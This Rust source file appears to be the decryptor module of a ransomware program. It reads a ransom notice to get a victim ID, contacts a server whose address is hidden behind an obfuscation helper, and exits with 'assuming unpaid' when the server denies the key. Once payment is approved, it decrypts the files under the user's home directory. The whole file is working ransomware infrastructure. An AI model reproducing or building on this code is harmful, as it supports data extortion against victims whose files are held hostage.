use std::fs;
use std::path::PathBuf;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use std::{fs::read_to_string, process::exit};

use openssl::rsa::Rsa;
use tokio::net::TcpSocket;
use tracing::{event, Level};

use crate::comms::{self, Message};
use crate::filesystem::recurse_directory_with_channel;
use crate::obfuscation::get_ip;
use crate::{encryptor, THREADS};

pub(crate) async fn decryption_script(notice_path: PathBuf) {
    let content = read_to_string(&notice_path);
    if content.is_err() {
        event!(Level::ERROR, "Content could not be read, exiting...");
        sleep(Duration::from_secs(3));
        exit(1);
    }
    let content = content.unwrap();

    // extract UCID from message
    let ucid = content
        .split('\n')
        .nth(1)
        .unwrap()
        .split(':')
        .last()
        .unwrap()
        .trim();
    let ucid: u64 = ucid.parse().unwrap();

    event!(Level::DEBUG, "UCID extracted as: {:?}", ucid);
    let key = Rsa::generate(4096).unwrap();

    let request_blob =
        comms::Message::RequestKey(ucid, key.public_key_to_der().unwrap().as_slice()).to_req();

    let ip = get_ip();
    let addr = ip.parse().unwrap();

    // set up networking utilities
    let socket = TcpSocket::new_v4().unwrap();
    let mut stream = socket.connect(addr).await.unwrap();
    let mut read_buff = vec![0; 1024];

    loop {
        if stream.writable().await.is_ok() {
            let len = stream.try_write(&request_blob);
            if len.is_err() {
                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                // retry immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                let socket = TcpSocket::new_v4().unwrap();
                event!(Level::DEBUG, "Reconnecting to server...");
                stream = socket.connect(addr).await.unwrap();
                continue;
            }
        }

        event!(Level::DEBUG, "Waiting for stream to become readable...");
        if stream.readable().await.is_ok() {
            event!(Level::DEBUG, "Stream is readable, reading!");
            let len = stream.try_read(&mut read_buff);

            if len.is_err() {
                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                // retry immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                let socket = TcpSocket::new_v4().unwrap();
                event!(Level::INFO, "Reconnecting to server...");
                stream = socket.connect(addr).await.unwrap();
                continue;
            }

            let len = len.unwrap(); // len is valid, it's safe to unwrap

            match Message::from_req(&mut read_buff[0..len]) {
                Message::Denied(_) => {
                    event!(
                        Level::ERROR,
                        "Server rejected request, assuming unpaid. Exiting..."
                    );
                    sleep(Duration::from_secs(3));
                    exit(1);
                }
                Message::RateReject() => {
                    event!(
                    Level::WARN,
                    "Connection dropped by server due to rate limit. Reconnecting and retrying after 30 seconds."
                );
                    sleep(Duration::from_secs(31));
                    let socket = TcpSocket::new_v4().unwrap();
                    event!(Level::DEBUG, "Reconnecting to server...");
                    stream = socket.connect(addr).await.unwrap();
                    continue;
                }
                Message::Approved(decryption_key) => {
                    // key request approved
                    event!(
                        Level::INFO,
                        "Key request approved, decrypting key and preparing for file decryption.",
                    );
                    let key = openssl::pkey::PKey::from_rsa(key.clone()).unwrap();
                    let decryptor = openssl::encrypt::Decrypter::new(&key).unwrap();

                    let buffer_len = decryptor.decrypt_len(decryption_key).unwrap();
                    let mut decoded = vec![0u8; buffer_len];

                    // Decrypt the data and get its length
                    let decoded_len = decryptor.decrypt(decryption_key, &mut decoded).unwrap();

                    // Use only the part of the buffer with the decrypted data
                    let d_key = decoded[..decoded_len].to_vec();

                    let (s, r) = crossbeam_channel::unbounded();

                    event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");

                    if cfg!(target_os = "linux") {
                        let _ = Command::new("ulimit").arg("-n 1048576").output();
                        // set file ulimit to prevent termination from file handler leak
                    }
                    recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);

                    let mut threads = Vec::new();

                    event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
                    for _ in 0..THREADS {
                        // start workers
                        let thread_reciever = r.clone();
                        let thread_key = d_key.clone();
                        threads.push(tokio::spawn(async move {
                            encryptor::encrypt_files(thread_reciever, thread_key, false).await;
                        }));
                    }

                    for thread in threads {
                        let _ = thread.await;
                    }
                    let _ = fs::remove_file(notice_path);
                    event!(Level::INFO, "Decryption completed, exiting...");
                    exit(0);
                }
                x => {
                    event!(
                        Level::DEBUG,
                        "Recieved invalid message from server: {:?}",
                        x
                    );
                    continue;
                }
            }
        }
    }
}
